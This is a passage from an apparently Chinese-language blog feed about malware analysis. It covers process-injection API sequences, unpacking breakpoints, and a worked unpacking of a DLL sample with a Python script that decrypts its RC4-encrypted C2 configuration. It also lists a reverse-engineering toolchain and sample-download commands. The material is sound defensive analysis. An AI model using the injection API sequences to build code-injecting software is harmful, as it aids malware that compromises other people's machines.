)</span></span><br></code></pre></td></tr></table></figure><h3 id="5-10-额外窗口内存注入"><a href="#5-10-额外窗口内存注入" class="headerlink" title="5.10 额外窗口内存注入"></a>5.10 额外窗口内存注入</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">FindWindowsA</span>( ),<br><span class="hljs-built_in">GetWindowThreadProcessId</span>( ), <span class="hljs-built_in">OpenProcess</span>( ), <span class="hljs-built_in">VirtualAllocEx</span>( ), <span class="hljs-built_in">WriteProcessMemory</span>( ),<br><span class="hljs-built_in">SetWindowLongPtrA</span>( ) <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">SendNotify</span><span class="hljs-params">( )</span></span><br></code></pre></td></tr></table></figure><h3 id="5-11-Propagate注入"><a href="#5-11-Propagate注入" class="headerlink" title="5.11 Propagate注入"></a>5.11 Propagate注入</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">FindWindow</span>( ), <span class="hljs-built_in">FindWindowEx</span>( ), <span class="hljs-built_in">GetProp</span>( ),<br><span class="hljs-built_in">GetWindowThreadProcessId</span>( ), <span class="hljs-built_in">OpenProcess</span>( ), <span class="hljs-built_in">ReadProcessMemory</span>( ), <span class="hljs-built_in">VirtualAllocEx</span>( ),<br><span class="hljs-built_in">WriteProcessMemory</span>( ), <span class="hljs-built_in">SetProp</span>( ) <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">PostMessage</span><span class="hljs-params">( )</span></span><br></code></pre></td></tr></table></figure><h2 id="6-脱壳手段"><a href="#6-脱壳手段" class="headerlink" title="6.脱壳手段"></a>6.脱壳手段</h2><h3 id="6-1-关键API设置断点"><a href="#6-1-关键API设置断点" class="headerlink" title="6.1 关键API设置断点"></a>6.1 关键API设置断点</h3><ul><li><strong>CreateProcessInternalW( )</strong></li><li><strong>VirtualAlloc( )</strong> | <strong>VirtualAllocEx( )</strong></li><li><strong>VirtualProtect( ) | ZwProtectVirtualMemory( )</strong></li><li><strong>WriteProcessMemory( ) | NtWriteProcessMemory( )</strong></li><li><strong>ResumeThread( ) | NtResumeThread( )</strong></li><li><strong>CryptDecrypt( ) | RtlDecompressBuffer( )</strong></li><li><strong>NtCreateSection( ) + MapViewOfSection( ) | ZwMapViewOfSection( )</strong></li><li><strong>UnmapViewOfSection( ) | ZwUnmapViewOfSection( )</strong></li><li><strong>NtWriteVirtualMemory( )</strong></li><li><strong>NtReadVirtualMemory( )</strong></li></ul><p><strong>注意事项：</strong></p><p>1.需要执行到程序模板后设置断点，越过系统初始化部分。</p><p>2.使用反调试插件，有时候还需要忽略全部异常。</p><p>3.在VirtualAlloc( )函数设置断点时，建议设置在返回代码（ret 10）处，之后设置内存写入断点来监控这块内存。</p><p>4.可以使用Intel PIN工具来追踪OEP</p><h3 id="6-2-设置DLL加载断点"><a href="#6-2-设置DLL加载断点" class="headerlink" title="6.2 设置DLL加载断点"></a>6.2 设置DLL加载断点</h3><p>在每个DLL加载的过程中去检索内存</p><h3 id="6-3-自动化脱壳工具"><a href="#6-3-自动化脱壳工具" class="headerlink" title="6.3 自动化脱壳工具"></a>6.3 自动化脱壳工具</h3><p>内存扫描工具1：<a href="https://github.com/hasherezade/hollows_hunter">hasherezade&#x2F;hollows_hunter: Scans all running processes. Recognizes and dumps a variety of potentially malicious implants (replaced&#x2F;implanted PEs, shellcodes, hooks, in-memory patches). (github.com)</a></p><p>内存扫描工具2：<a href="https://github.com/hasherezade/pe-sieve">Releases · hasherezade&#x2F;pe-sieve (github.com)</a></p><p>内存转储：<a href="https://github.com/hasherezade/mal_unpack">hasherezade&#x2F;mal_unpack: Dynamic unpacker based on PE-sieve (github.com)</a></p><h3 id="6-4-付费脱壳"><a href="#6-4-付费脱壳" class="headerlink" title="6.4 付费脱壳"></a>6.4 付费脱壳</h3><p><a href="https://www.unpac.me/#/">https://www.unpac.me/#/</a></p><h2 id="7-示例分析"><a href="#7-示例分析" class="headerlink" title="7.示例分析"></a>7.示例分析</h2><h3 id="7-1-脱壳"><a href="#7-1-脱壳" class="headerlink" title="7.1 脱壳"></a>7.1 脱壳</h3><p>先用PE bear看一下，导入表中不存在网络相关的API吗。可能被隐藏了。</p><p><img src="/2022/10/04/malware-analysis-tuo-ke-yu-c2-ti-qu/image-20221006224007945.png" alt="查看导入表"></p><p>再使用PEStdudio查看一下节表，.data段的raw size与virtual size差别很大，很可疑。</p><p><img src="/2022/10/04/malware-analysis-tuo-ke-yu-c2-ti-qu/image-20221006224140735.png" alt="查看节表"></p><p>因为目标程序是DLL，可以使用rundll32.exe以及指定导出函数的方式进行调试。</p><p>命令行参数：”C:\Windows\SysWOW64\rundll32.exe” C:\Users\mas\Desktop\8ff43b6ddf6243bd5ee073f9987920fa223809f589d151d7e438fd8cc08ce292\sample_1.bin,#1</p><p><strong>表示调用第一个导出函数</strong></p><p><img src="/2022/10/04/malware-analysis-tuo-ke-yu-c2-ti-qu/image-20221006224700218.png" alt="x32dbg调试dll"></p><p>在内存相关API下断点。（VirtualAlloc ret 0x10、VirtualProtect、ResumeThread）</p><p><img src="/2022/10/04/malware-analysis-tuo-ke-yu-c2-ti-qu/image-20221006224745648.png" alt="设置断点"></p><p>F9运行，会在VirtualAlloc处首次断下，将eax所指的地址放到内存窗口1进行观察；继续F9，还会在此函数断下，继续将地址放入内存窗口2观察；继续F9，重复上述步骤；继续F9，会在VirtualProtected处断下，并且内存窗口3中的内容如下：</p><p><img src="/2022/10/04/malware-analysis-tuo-ke-yu-c2-ti-qu/image-20221006225231324.png" alt="内存窗口3"></p><p>可以看见是 aPLib 压缩格式，将此内存区域的内存dump出来。</p><p><img src="/2022/10/04/malware-analysis-tuo-ke-yu-c2-ti-qu/image-20221006225413256.png" alt="内存dump"></p><p>拖入010editor，搜索字符串MZ，可以发现存在PE文件。</p><p><img src="/2022/10/04/malware-analysis-tuo-ke-yu-c2-ti-qu/image-20221006225754919.png" alt="010搜索PE"></p><p>将MZ前的数据全部删除，并保存，此时得到一个完整的PE文件，拖入PE Bear中查看导入表，可以发现网络相关的API都出现了。</p><p><img src="/2022/10/04/malware-analysis-tuo-ke-yu-c2-ti-qu/image-20221006225928161.png" alt="dump_1.bin"></p><h3 id="7-2-分析解密算法"><a href="#7-2-分析解密算法" class="headerlink" title="7.2 分析解密算法"></a>7.2 分析解密算法</h3><p>此时基本的脱壳已经完成，接下来寻找这个程序的C2配置，在IDA中打开dump_1.binv并点击ida中的Unexplored区域头部。</p><p><img src="/2022/10/04/malware-analysis-tuo-ke-yu-c2-ti-qu/image-20221006230229938.png" alt="Unexplored区域"></p><p>此处根据经验猜测 byte_10004010 为8字节密钥，unk_10004018 为加密后的数据，查看byte_10004010处的交叉引用，定位操作代码。</p><p><img src="/2022/10/04/malware-analysis-tuo-ke-yu-c2-ti-qu/image-20221006230628513.png" alt="sub_10001CB7"></p><p>向上分析一下，可以判断sub_100011A4函数是申请堆内存，如图所示：</p><p><img src="/2022/10/04/malware-analysis-tuo-ke-yu-c2-ti-qu/image-20221006230756414.png" alt="sub_100011A4"></p><p>sub_10001214函数就是memcpy函数，如图所示：</p><p><img src="/2022/10/04/malware-analysis-tuo-ke-yu-c2-ti-qu/image-20221006230904227.png" alt="sub_10001214"></p><p>此时代码变成如下：</p><p><img src="/2022/10/04/malware-analysis-tuo-ke-yu-c2-ti-qu/image-20221006231019430.png" alt="sub_10001CB7整理"></p><p>sub_10002131函数中进行加解密操作，分析结果如下：</p><p><img src="/2022/10/04/malware-analysis-tuo-ke-yu-c2-ti-qu/image-20221006231229805.png" alt="sub_10002131整理"></p><p><strong>解密算法为：</strong></p><p>使用SHA1对8字节的key进行hash，得到rc4的5字节密钥，再使用此密钥进行rc4解密得到C2配置。</p><p><strong>信息整理如下：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">原始key: C58B00157F8E9288 (after first 16 bytes of .data section)<br>加密数据地址: 0x10004018<br>加密数据大小: 0x2000<br><span class="hljs-built_in">hash</span>算法: SHA1 (20 bytes)<br>解密算法: RC4<br>RC4 Key 长度: 5 bytes<br></code></pre></td></tr></table></figure><h3 id="7-3-编写自动化脚本"><a href="#7-3-编写自动化脚本" class="headerlink" title="7.3 编写自动化脚本"></a>7.3 编写自动化脚本</h3><p><strong>编写python3脚本实现自动提取C2配置：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> pefile<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> ARC4<br><span class="hljs-keyword">from</span> Crypto.Hash <span class="hljs-keyword">import</span> SHA<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_data</span>(<span class="hljs-params">filename</span>):<br><br>    pe = pefile.PE(filename)<br>    <span class="hljs-keyword">for</span> section <span class="hljs-keyword">in</span> pe.sections:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;.data&quot;</span> <span class="hljs-keyword">in</span> section.Name.decode(encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>).rstrip(<span class="hljs-string">&#x27;x00&#x27;</span>):<br>            <span class="hljs-keyword">return</span> section.get_data(section.VirtualAddress, section.SizeOfRawData)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">data_decryptor</span>(<span class="hljs-params">rc4key, encrypted_config</span>):<br>    <br>    rc4_cipher = ARC4.new(rc4key)<br>    decrypted_config = rc4_cipher.decrypt(encrypted_config)<br>    <span class="hljs-keyword">return</span> decrypted_config<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br><br>    filename = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Filename: &quot;</span>)<br>    <span class="hljs-comment"># 获取.data节数据</span><br>    datasec = extract_data(filename)<br>    datesec2 = datasec[<span class="hljs-number">16</span>:]<br>    <span class="hljs-comment"># 获取8字节key</span><br>    key = (datesec2[:<span class="hljs-number">8</span>])<br>    <span class="hljs-comment"># 获取加密数据</span><br>    encrypted_data = binascii.hexlify(datesec2[<span class="hljs-number">8</span>:<span class="hljs-number">0x2000</span>])<br>    <span class="hljs-comment"># SHA1计算hash</span><br>    hashed_key = SHA.new(key).hexdigest()<br>    <span class="hljs-comment"># 得到rc4密钥（10表示前10个十六进制数，5个字节）</span><br>    true_key = hashed_key[:<span class="hljs-number">10</span>]<br>    <span class="hljs-comment"># rc4解密C2配置</span><br>    c2_config = data_decryptor(binascii.unhexlify(true_key), binascii.unhexlify(encrypted_data))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n\nThe decrypted configuration follows: \n&quot;</span>)<br>    <span class="hljs-built_in">print</span>(c2_config.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span> :<br>    main( )<br></code></pre></td></tr></table></figure><p><strong>执行结果如下：</strong></p><p><img src="/2022/10/04/malware-analysis-tuo-ke-yu-c2-ti-qu/image-20221006232524037.png" alt="脚本执行结果"></p><h3 id="7-4-额外收获"><a href="#7-4-额外收获" class="headerlink" title="7.4 额外收获"></a>7.4 额外收获</h3><ul><li>调试dll，使用rundll32.exe加参数的方式。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-string">&quot;C:\Windows\SysWOW64\rundll32.exe&quot;</span> C:\Users\mas\Desktop\test.bin,<span class="hljs-comment">#1</span><br></code></pre></td></tr></table></figure><ul><li>python导入第三方库</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip install pycryptodome（python 2.7需要改cypto文件夹首字母大写）<br>pip install pefile<br></code></pre></td></tr></table></figure><ul><li>unbuntu解压带密码的zip</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get install p7zip-full<br>7z x test.zip<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> malware analysis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Malware Analysis 环境构建</title>
      <link href="/2022/10/04/malware-analysis-huan-jing-gou-jian/"/>
      <url>/2022/10/04/malware-analysis-huan-jing-gou-jian/</url>
      
        <content type="html"><![CDATA[<h2 id="1-虚拟机"><a href="#1-虚拟机" class="headerlink" title="1.虚拟机"></a>1.虚拟机</h2><p><strong>操作系统：</strong></p><p>Windows 7&#x2F;10&#x2F;11</p><p>REmnux<a href="https://docs.remnux.org/install-distro/get-virtual-appliance">Get the Virtual Appliance - REMnux Documentation</a></p><p>Ubuntu  <a href="https://ubuntu.com/download/desktop">Download Ubuntu Desktop | Download | Ubuntu</a></p><h2 id="2-静态分析"><a href="#2-静态分析" class="headerlink" title="2.静态分析"></a>2.静态分析</h2><p>IDA Pro<a href="https://hex-rays.com/ida-pro/">Hex Rays - State-of-the-art binary code analysis solutions (hex-rays.com)</a></p><p>Ghidra <a href="https://github.com/NationalSecurityAgency/ghidra">NationalSecurityAgency&#x2F;ghidra: Ghidra is a software reverse engineering (SRE) framework (github.com)</a></p><h2 id="3-动态调试"><a href="#3-动态调试" class="headerlink" title="3.动态调试"></a>3.动态调试</h2><p>Windbg</p><p>x64dbg  <a href="https://x64dbg.com/#start">x64dbg</a></p><p>​ScyllaHide<a href="https://github.com/x64dbg/ScyllaHide/releases">Releases · x64dbg&#x2F;ScyllaHide (github.com)</a></p><p>​Labeless<a href="https://github.com/a1ext/labeless/releases">Releases · a1ext&#x2F;labeless (github.com)</a></p><p>​    DbgChild   <a href="https://github.com/therealdreg/DbgChild">therealdreg&#x2F;DbgChild: Debug Child Process Tool (auto attach) (github.com)</a></p><h2 id="4-PE查看与修复"><a href="#4-PE查看与修复" class="headerlink" title="4.PE查看与修复"></a>4.PE查看与修复</h2><p>PEBear：用于修复脱壳后的PE文件，以及查看pe信息</p><p><a href="https://github.com/hasherezade/pe-bear-releases">hasherezade&#x2F;pe-bear-releases: PE-bear (builds only) (github.com)</a></p><p>CFF Explorer<br><a href="https://ntcore.com/?page_id=388">Explorer Suite – NTCore</a></p><p>Pestudio：用于快速获取恶意软件相关信息</p><p><a href="https://www.winitor.com/">Winitor</a></p><p>pe_unmapper：用于完成PE文件映射与非映射状态的转换</p><p><a href="https://github.com/hasherezade/libpeconv/tree/master/pe_unmapper">libpeconv&#x2F;pe_unmapper at master · hasherezade&#x2F;libpeconv (github.com)</a></p><h2 id="5-二进制编辑"><a href="#5-二进制编辑" class="headerlink" title="5.二进制编辑"></a>5.二进制编辑</h2><p>010Editor：16进制文本编辑工具</p><p>HxD：16进制文本编辑工具</p><p><a href="https://mh-nexus.de/en/hxd/">HxD - Freeware Hex Editor and Disk Editor | mh-nexus</a></p><p>XVI32 Hex Editor：16进制文本编辑工具</p><p><a href="http://www.chmaas.handshake.de/delphi/freeware/xvi32/xvi32.htm">Freeware Hex Editor XVI32 (handshake.de)</a></p><h2 id="6-样本信息收集"><a href="#6-样本信息收集" class="headerlink" title="6.样本信息收集"></a>6.样本信息收集</h2><h3 id="6-1-Malware-Bazaar"><a href="#6-1-Malware-Bazaar" class="headerlink" title="6.1 Malware Bazaar"></a>6.1 Malware Bazaar</h3><p>支持查看样本信息以及根据hash下载样本。常用命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">// 根据<span class="hljs-built_in">hash</span>下载样本<br>malwoverview.py -b 5 -B <span class="hljs-built_in">hash</span><br><br>// 粗略分析样本行为<br>malwoverview.py -b 1 -B <span class="hljs-built_in">hash</span><br><br>// 获取Botnet的一些信息<br>malwoverview.py -x 1 -X <span class="hljs-built_in">hash</span><br>malwoverview.py -x 2 -X Triage_ID<br><br>// 获取沙箱分析报告<br>malwoverview.py -x 7 -X Triage_ID<br></code></pre></td></tr></table></figure><p><strong>常用命令如下：</strong></p><p>-h：查看命令帮助</p><p>-c：手动指定API配置文件(.malwapi.conf)，模板如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">[</span>VIRUSTOTAL<span class="hljs-punctuation">]</span><br>VTAPI = https<span class="hljs-punctuation">:</span><span class="hljs-comment">//www.virustotal.com/gui/join-us</span><br><br><span class="hljs-punctuation">[</span>HYBRID-ANALYSIS<span class="hljs-punctuation">]</span><br>HAAPI = https<span class="hljs-punctuation">:</span><span class="hljs-comment">//www.hybrid-analysis.com/signup</span><br><br><span class="hljs-punctuation">[</span>MALSHARE<span class="hljs-punctuation">]</span><br>MALSHAREAPI = https<span class="hljs-punctuation">:</span><span class="hljs-comment">//malshare.com/doc.php</span><br><br><span class="hljs-punctuation">[</span>HAUSSUBMIT<span class="hljs-punctuation">]</span><br>HAUSSUBMITAPI =https<span class="hljs-punctuation">:</span><span class="hljs-comment">//urlhaus.abuse.ch/api/#account</span><br><br><span class="hljs-punctuation">[</span>POLYSWARM<span class="hljs-punctuation">]</span><br>POLYAPI =  https<span class="hljs-punctuation">:</span><span class="hljs-comment">//docs.polyswarm.io/consumers</span><br><br><span class="hljs-punctuation">[</span>ALIENVAULT<span class="hljs-punctuation">]</span><br>ALIENAPI = https<span class="hljs-punctuation">:</span><span class="hljs-comment">//otx.alienvault.com/api</span><br><br><span class="hljs-punctuation">[</span>MALPEDIA<span class="hljs-punctuation">]</span><br>MALPEDIAAPI =<br><br><span class="hljs-punctuation">[</span>TRIAGE<span class="hljs-punctuation">]</span><br>TRIAGEAPI = https<span class="hljs-punctuation">:</span><span class="hljs-comment">//tria.ge/signup</span><br></code></pre></td></tr></table></figure><p>-o：指定输出信息颜色（0、1）</p><table><thead><tr><th>-o</th><th>info</th></tr></thead><tbody><tr><td>0</td><td>深色</td></tr><tr><td>1</td><td>浅色</td></tr></tbody></table><p>-b：从MALWARE和THREATFOX中检索信息，-B指定附加参数，可以获得API分析分析报告</p><table><thead><tr><th>-b</th><th>-B</th><th>info</th></tr></thead><tbody><tr><td>1</td><td>hash</td><td>检索hash信息</td></tr><tr><td>2</td><td>tag</td><td>根据标签获取相关信息以及样本列表</td></tr><tr><td>3</td><td>imphash</td><td>根据imphash样本列表</td></tr><tr><td>4</td><td>100&#x2F;time</td><td>查询最新的恶意样本</td></tr><tr><td>5</td><td>hash</td><td>下载样本，解压密码：infected</td></tr><tr><td>6</td><td>days</td><td>获取IOC数据集</td></tr><tr><td>7</td><td>ioc</td><td>搜索指定IOC</td></tr><tr><td>8</td><td>tag</td><td>根据指定标签检索IOC</td></tr><tr><td>9</td><td>family</td><td>根据家族检索IOC</td></tr><tr><td>10</td><td></td><td>列出所有可用的家族</td></tr></tbody></table><p>-x：从TRIAGE中检索信息，-X指定附加参数，可以获得更详细的分析报告。</p><table><thead><tr><th>-x</th><th>-X</th><th>info</th></tr></thead><tbody><tr><td>1</td><td>hash&#x2F;md5&#x2F;family&#x2F;score&#x2F;tag&#x2F;url&#x2F;wallet&#x2F;ip</td><td>获取信息</td></tr><tr><td>2</td><td>Triage ID</td><td>获取报告</td></tr><tr><td>3</td><td></td><td>提交样本进行分析</td></tr><tr><td>4</td><td>url</td><td>提交url进行分析</td></tr><tr><td>5</td><td>Triage ID</td><td>下载Triage ID指定的样本</td></tr><tr><td>6</td><td>Triage ID</td><td>下载pcapng文件</td></tr><tr><td>7</td><td>Triage ID</td><td>获取沙箱动态报告</td></tr></tbody></table><p>-d：指定目录进行VT扫描，-D指定api</p><table><thead><tr><th>-d</th><th>-D</th><th>info</th></tr></thead><tbody><tr><td>dir</td><td>0</td><td>公开api</td></tr><tr><td>dir</td><td>1</td><td>优质api</td></tr></tbody></table><p>-v：从VIRUS TOTAL中检索信息，-V指定扫描参数</p><table><thead><tr><th>-v</th><th>-V</th><th>info</th></tr></thead><tbody><tr><td>1</td><td>file</td><td>获取VT报告</td></tr><tr><td>2</td><td>file</td><td>获取反病毒报告</td></tr><tr><td>3</td><td>file</td><td>获取反病毒报告，包括IAT和EAT</td></tr><tr><td>4</td><td>file</td><td>提取overlay</td></tr><tr><td>5</td><td>url</td><td>获取VT报告</td></tr><tr><td>6</td><td>ip</td><td>获取VT报告</td></tr><tr><td>7</td><td>file</td><td>获取provided domain报告</td></tr><tr><td>8</td><td>hash</td><td>验证指定Hash</td></tr><tr><td>9</td><td>file(&gt;&#x3D;20m)</td><td>获取VT报告</td></tr><tr><td>10</td><td>file</td><td>从指定文件中验证Hash，使用公开API</td></tr><tr><td>11</td><td>file</td><td>从指定文件中验证Hash，使用优质API</td></tr><tr><td>12</td><td>file</td><td>获取Hash样本行为</td></tr><tr><td>13</td><td>file(&gt;&#x3D;32m)</td><td>向vt提交超过32MB的文件</td></tr></tbody></table><p>-a 从HYBRID中检索信息。-A 指定附加参数</p><table><thead><tr><th>-a</th><th>-A</th><th>info</th></tr></thead><tbody><tr><td>1</td><td>hash&#x2F;file</td><td>获取Windows 32位分析报告</td></tr><tr><td>2</td><td>hash&#x2F;file</td><td>获取Windows32位分析报告，HWP支持</td></tr><tr><td>3</td><td>hash&#x2F;file</td><td>获取Windows 64位分析报告</td></tr><tr><td>4</td><td>hash&#x2F;file</td><td>获取Android环境分析报告</td></tr><tr><td>5</td><td>hash&#x2F;file</td><td>获取Linux 64分析报告</td></tr><tr><td>6</td><td>hash&#x2F;file</td><td>提交Windows 32位样本</td></tr><tr><td>7</td><td>hash&#x2F;file</td><td>提交Windows 32位样本，HWP支持</td></tr><tr><td>8</td><td>hash&#x2F;file</td><td>提交Windows 64位样本</td></tr><tr><td>9</td><td>hash&#x2F;file</td><td>提交安卓环境样本</td></tr><tr><td>10</td><td>hash&#x2F;file</td><td>提交Linux 64位样本</td></tr><tr><td>11</td><td>hash&#x2F;file</td><td>下载Windows 32位样本</td></tr><tr><td>12</td><td>hash&#x2F;file</td><td>下载Windows 32位样本，HWP支持</td></tr><tr><td>13</td><td>hash&#x2F;file</td><td>下载安卓环境样本</td></tr><tr><td>14</td><td>hash&#x2F;file</td><td>下载Linux 64样本</td></tr></tbody></table><p>-l：从MALSHARE中检索信息，-L指定附加参数</p><table><thead><tr><th>-l</th><th>-L</th><th>info</th></tr></thead><tbody><tr><td>1</td><td>hash</td><td>默认下载样本</td></tr><tr><td>2</td><td>hash</td><td>PE32</td></tr><tr><td>3</td><td>hash</td><td>ELF</td></tr><tr><td>4</td><td>hash</td><td>Java</td></tr><tr><td>5</td><td>hash</td><td>PDF</td></tr><tr><td>6</td><td>hash</td><td>Composite(OLE)</td></tr></tbody></table><p>-j：从URLHaus中检索信息，-J指定附加参数</p><table><thead><tr><th>-j</th><th>-J</th><th>info</th></tr></thead><tbody><tr><td>1</td><td>hash</td><td>下载样本</td></tr><tr><td>2</td><td>hash</td><td>查询样本信息</td></tr><tr><td>3</td><td>url</td><td>查询url信息</td></tr><tr><td>4</td><td>tag</td><td>根据标签检索恶意url</td></tr><tr><td>5</td><td>tag</td><td>根据标签检索payload</td></tr><tr><td>6</td><td></td><td>检索最近有效载荷的可下载链接列表</td></tr><tr><td>7</td><td></td><td>检索最近的恶意url列表</td></tr></tbody></table><p>-p：从POLYSWARM中检索Linux样本相关信息，-P指定附加参数</p><p>-y：从Hybrid中检索Android样本相关信息，-Y指定附加参数</p><p>-n：从ALIENVAULT中检索信息，-N指定附加参数</p><table><thead><tr><th>-n</th><th>-N</th><th>info</th></tr></thead><tbody><tr><td>1</td><td>subscribed pulses</td><td>获取subscribed pulses信息</td></tr><tr><td>2</td><td>ip</td><td>获取ip地址信息</td></tr><tr><td>3</td><td>domain</td><td>获取域名信息</td></tr><tr><td>4</td><td>hash</td><td>获取hash信息</td></tr><tr><td>5</td><td>url</td><td>获取url信息</td></tr></tbody></table><p>-m：从MALPEDIA中检索家族信息，-M指定附加参数，这个api不好获取</p><h3 id="6-2-Malware-Bazaar-bug修复"><a href="#6-2-Malware-Bazaar-bug修复" class="headerlink" title="6.2 Malware Bazaar-bug修复"></a>6.2 Malware Bazaar-bug修复</h3><p>在使用-x命令检索TRIAGE数据库时，需要指定api的同时指定token，而原项目代码中没有提供设置token的接口，执行-x指令会出现如下错误。</p><p><img src="/2022/10/04/malware-analysis-huan-jing-gou-jian/image-20221004220527110.png" alt="报错信息"></p><p>添加代码从json文件中读取token</p><p><img src="/2022/10/04/malware-analysis-huan-jing-gou-jian/image-20221004220244614.png" alt="添加json解析"></p><p>将所有的引用处改为如下格式：</p><p><img src="/2022/10/04/malware-analysis-huan-jing-gou-jian/image-20221004220335138.png" alt="修改代码"></p><p>修改完成后可以得到正确结果：</p><p><img src="/2022/10/04/malware-analysis-huan-jing-gou-jian/image-20221004220621915.png" alt="正确结果"></p><h2 id="7-IDA插件"><a href="#7-IDA插件" class="headerlink" title="7.IDA插件"></a>7.IDA插件</h2><h3 id="7-1-Labeless插件"><a href="#7-1-Labeless插件" class="headerlink" title="7.1 Labeless插件"></a>7.1 Labeless插件</h3><p>用于实现IDA与x64dbg同步注释</p><h4 id="7-1-1-安装"><a href="#7-1-1-安装" class="headerlink" title="7.1.1 安装"></a>7.1.1 安装</h4><h5 id="调试机"><a href="#调试机" class="headerlink" title="调试机"></a>调试机</h5><p>1.安装python 2.7（x86和x64都要装，x86添加进环境变量）</p><p>2.进行如下操作：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> c:\deploy<br>c:\Python27\python.exe setup_protobuf.py<br><br>// 有网络<br>pip install --upgrade labeless<br><br>// 无网络<br>c:\Python27\Scripts\pip.exe install labeless-1.1.2.65-py2.py3-none-any.whl<br></code></pre></td></tr></table></figure><p>3.将插件dll复制进x96dbg的plugins目录</p><h5 id="分析机"><a href="#分析机" class="headerlink" title="分析机"></a>分析机</h5><p>1.安装python 2.7（x86和x64都要装，x86添加进环境变量）</p><p>2.拷贝IDA插件到plugins目录</p><h4 id="7-1-2-使用"><a href="#7-1-2-使用" class="headerlink" title="7.1.2 使用"></a>7.1.2 使用</h4><p><img src="/2022/10/04/malware-analysis-huan-jing-gou-jian/image-20221005191959119.png" alt="Labeless"></p><h3 id="7-2-ret-sync插件"><a href="#7-2-ret-sync插件" class="headerlink" title="7.2 ret-sync插件"></a>7.2 ret-sync插件</h3><p>支持调试器与IDA同步调试，源项目支持为Windbg开启Trace功能，但是不够完善，不支持清除trace痕迹，同时x64dbg不具备trace功能。</p><h4 id="7-2-1-windbg添加trace清除"><a href="#7-2-1-windbg添加trace清除" class="headerlink" title="7.2.1 windbg添加trace清除"></a>7.2.1 windbg添加trace清除</h4><p>在IDAxx&#x2F;plugins&#x2F;SyncPlugin.py中添加如下代码：</p><p><img src="/2022/10/04/malware-analysis-huan-jing-gou-jian/image-20221005203116973.png" alt="SyncPlugin.py中添加代码"></p><p>在windbg插件项目中sync.cpp文件中添加如下代码来注册命令：</p><p><img src="/2022/10/04/malware-analysis-huan-jing-gou-jian/image-20221005203525574.png" alt="修改windbg插件代码"></p><p>此时只需要在windbg中输入 !bc cls 即可清空当前函数的痕迹。</p><h4 id="7-2-2-x64dbg添加trace功能"><a href="#7-2-2-x64dbg添加trace功能" class="headerlink" title="7.2.2 x64dbg添加trace功能"></a>7.2.2 